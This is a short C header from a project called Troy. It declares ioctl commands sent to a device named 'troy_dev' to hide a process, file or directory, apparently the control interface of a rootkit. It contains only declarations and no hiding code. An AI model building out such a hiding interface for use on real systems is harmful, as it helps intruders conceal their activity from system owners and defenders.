//
//  configure.h
//  Troy
//
//  Created by Axis on 15/5/6.
//  Copyright (c) 2015年 Axis. All rights reserved.
//

#ifndef Troy_configure_h
#define Troy_configure_h

#include <sys/ioctl.h>

#pragma pack(4)
typedef struct _troy_hide_object
{
    enum
    {
        TROY_DIR=1,
        TROY_FILE,
        TROY_PROCESS
    }objec_type;
    char *name;
}troy_hide_object;
#pragma pack()

#pragma mark - DEVICE CMD
#define MAGIC 'a'
#define TROY_CMD_HIDE_PROCESS _IOWR(MAGIC, 1, troy_hide_object)
#define TROY_CMD_HIDE_FILE _IOWR(MAGIC, 2, troy_hide_object)
#define TROY_CMD_HIDE_DIR _IOWR(MAGIC, 3, troy_hide_object)

#pragma mark - ERROR CODE
#define TROY_SUCCESS 1
#define TROY_ERROR_BASIC 0
#define TROY_ERROR_NOT_MATCH TROY_ERROR_BASIC-1
#define TROY_ERROR_INVALID_PARAMETER TROY_ERROR_BASIC-2

#pragma mark -
#define TROY_DEV_NAME "troy_dev"

#endif
